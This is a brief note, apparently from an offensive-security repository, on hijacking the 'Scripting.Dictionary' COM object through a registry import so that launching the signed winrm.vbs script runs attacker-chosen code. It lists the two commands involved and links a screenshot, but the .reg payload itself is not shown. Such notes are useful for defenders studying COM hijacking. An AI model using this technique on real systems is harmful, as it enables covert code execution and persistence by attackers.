Here, we can use Winrm.vbs to hijack COM object by making "Scripting.Dictionary" invokes COM file in registry, Scripting.Dictionary is often refers to ProgID.


Instructions:

```

C:\>reg import "file.reg"
The operation completed successfully.

C:\>start C:\Windows\System32\winrm.vbs

C:\>
```


![21312313](https://user-images.githubusercontent.com/25440152/58567597-7876f080-81e7-11e9-971b-6362f2db1247.PNG)
